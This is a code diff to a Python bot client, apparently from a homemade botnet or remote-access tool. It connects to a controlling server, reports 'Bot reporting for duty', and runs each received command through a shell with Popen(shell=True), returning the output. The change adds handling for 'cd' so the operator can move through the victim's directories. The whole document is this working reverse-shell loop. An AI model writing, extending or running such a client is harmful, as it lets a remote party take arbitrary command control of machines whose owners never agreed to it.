@@ -12,17 +12,22 @@ clientSocket.connect((serverName, serverPort))
 clientSocket.send('Bot reporting for duty'.encode())
 command = clientSocket.recv(4064).decode()
 
-while command != "exit":
 
-	#We need to add shell=True here in order for the command to be executed through the root shell.
-	# It's a big security hole, but...
-	proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
-	result, err = proc.communicate()
-	if(err != ""):
-		print(err)
-	clientSocket.send(result + err)
-	command = (clientSocket.recv(4064)).decode()
+while command != "exit": 
+	if command[:2] == "cd":
+		if(os.path.isdir(command[3:]) == 1):
+			os.chdir(command[3:])
+			clientSocket.send("changed directory")
+		else:
+			clientSocket.send("Invalid directory path")
+		command = (clientSocket.recv(4064)).decode()
+	else:
+		proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+		result, err = proc.communicate()
+		if(err != ""):
+			print(err)
+		clientSocket.send(result + err)
+		command = (clientSocket.recv(4064)).decode()
 	
-
 
 clientSocket.close()
